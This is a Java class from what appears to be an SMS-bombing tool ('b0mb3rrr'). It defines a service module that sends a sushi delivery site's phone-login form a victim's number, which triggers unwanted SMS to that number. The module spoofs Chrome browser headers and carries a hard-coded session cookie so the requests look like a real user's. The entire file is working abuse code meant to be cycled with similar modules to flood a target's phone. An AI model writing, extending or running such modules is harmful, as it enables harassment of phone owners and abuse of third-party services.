package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.FormBody;
import okhttp3.Request;

public class Sushirolla extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        return new Request.Builder()
                .url("https://sushirolla.ru/page/save.php")
                .post(new FormBody.Builder()
                        .add("quick_aut_send_phone", "1")
                        .add("phone", STR."+\{phone.phone()}")
                        .build())
                .header("accept", "*/*")
                .header("accept-language", "en-US,en;q=0.9,ru;q=0.8")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "PHPSESSID=545c467d0668468d249e2643dde47ee0; sr_is_user=1")
                .header("origin", "https://sushirolla.ru")
                .header("referer", "https://sushirolla.ru/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-ch-ua-platform", "\"Linux\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin");
    }

    @Override
    public String getServiceName() {
        return "Sushirolla";
    }
}
